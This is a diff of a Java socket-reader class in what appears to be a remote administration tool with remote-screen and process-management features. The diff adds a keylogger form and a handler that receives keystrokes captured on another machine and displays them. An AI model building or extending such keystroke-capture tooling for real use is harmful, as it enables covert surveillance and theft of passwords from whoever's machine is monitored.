@@ -25,17 +25,19 @@ public class CentralReader implements Runnable {
 	private ReceiveScreen receiveScreen = null;
 	private RemoteForm remoteForm = null;
 	private ProcessManagementForm processManagementForm = null;
+	private KeyloggerForm keyloggerForm = null;
 	
 	public CentralReader(Socket socket, Client client) throws IOException {
 		this.setClient(client);
 		this.setSocket(socket);
 		this.setRemoteForm(client.getRemoteForm());
-		processManagementForm = client.getProcessManagementForm();
+		this.setKeyloggerForm(client.getKeyloggerForm());
+		this.setProcessManagementForm(client.getProcessManagementForm());
 		dataInputStream = new DataInputStream(socket.getInputStream());
 		receiveScreen = new ReceiveScreen(socket, client);
 	}
 
-	@Override
+	@Override 
 	public void run() {
 		// TODO Auto-generated method stub
 		while(true) {
@@ -117,7 +119,12 @@ public class CentralReader implements Runnable {
 			        } else {
 			            System.out.println("Người dùng đã hủy thao tác lưu.");
 			        }
-					
+					break;
+				}
+				case -23: {
+					String keyChar = dataInputStream.readUTF();
+					keyloggerForm.listening(keyChar);
+					break;
 				}
 				default:
 //					throw new IllegalArgumentException("Unexpected value: " + type);
@@ -152,6 +159,22 @@ public class CentralReader implements Runnable {
 
 	public void setRemoteForm(RemoteForm remoteForm) {
 		this.remoteForm = remoteForm;
+	}
+
+	public KeyloggerForm getKeyloggerForm() {
+		return keyloggerForm;
+	}
+
+	public void setKeyloggerForm(KeyloggerForm keyloggerForm) {
+		this.keyloggerForm = keyloggerForm;
+	}
+	
+	public ProcessManagementForm getProcessManagementForm() {
+		return processManagementForm;
+	}
+	
+	public void setProcessManagementForm(ProcessManagementForm processManagementForm) {
+		this.processManagementForm = processManagementForm;
 	}
 
 }
